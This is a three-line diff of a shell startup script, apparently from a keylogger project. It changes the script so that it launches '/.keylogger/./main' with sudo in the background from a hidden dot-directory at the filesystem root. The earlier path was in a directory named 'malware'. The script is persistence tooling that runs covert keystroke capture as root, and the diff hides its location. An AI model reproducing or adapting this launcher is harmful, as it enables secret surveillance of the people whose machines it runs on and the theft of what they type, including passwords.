@@ -1,3 +1,3 @@
 #!/bin/sh
-sudo /home/matgrioni/malware/./main &
+sudo /.keylogger/./main &
 exit 0
